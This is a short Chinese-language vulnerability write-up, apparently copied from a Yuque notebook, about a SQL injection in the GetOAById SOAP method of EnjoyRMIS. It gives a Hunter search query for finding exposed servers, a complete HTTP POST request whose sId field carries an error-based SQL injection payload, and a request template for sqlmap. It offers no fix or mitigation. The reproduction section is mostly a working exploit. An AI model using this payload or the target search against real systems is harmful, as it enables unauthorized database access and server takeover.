# EnjoyRMIS GetOAById存在SQL注入漏洞

# 一、漏洞简介
EnjoyRMIS GetOAById存在SQL注入漏洞,攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。

# 二、影响版本
+ EnjoyRMIS

# 三、资产测绘
+ hunter`web.body="CheckSilverlightInstalled"`
+ 特征

![1700576375104-73ed7b01-1186-48d1-a163-ef4068a88d89.png](./img/4X5X0Jwq8Umbb0L0/1700576375104-73ed7b01-1186-48d1-a163-ef4068a88d89-537066.png)

# 四、漏洞复现
```plain
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOAById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOAById xmlns="http://tempuri.org/">
      <sId>string' AND 8448 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8448=8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113))) AND 'OFyo'='OFyo</sId>
    </GetOAById>
  </soap:Body>
</soap:Envelope>
```

![1700644019370-8d33a405-91e7-4c16-86af-0b666f3d946e.png](./img/4X5X0Jwq8Umbb0L0/1700644019370-8d33a405-91e7-4c16-86af-0b666f3d946e-534846.png)

sqlmap

```plain
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOAById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOAById xmlns="http://tempuri.org/">
      <sId>string</sId>
    </GetOAById>
  </soap:Body>
</soap:Envelope>
```

![1700644052319-929933e6-1c3c-4186-8449-0e4ce469a7f9.png](./img/4X5X0Jwq8Umbb0L0/1700644052319-929933e6-1c3c-4186-8449-0e4ce469a7f9-554815.png)



> 更新: 2024-02-29 23:55:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kqc59tbzda7rl8f6>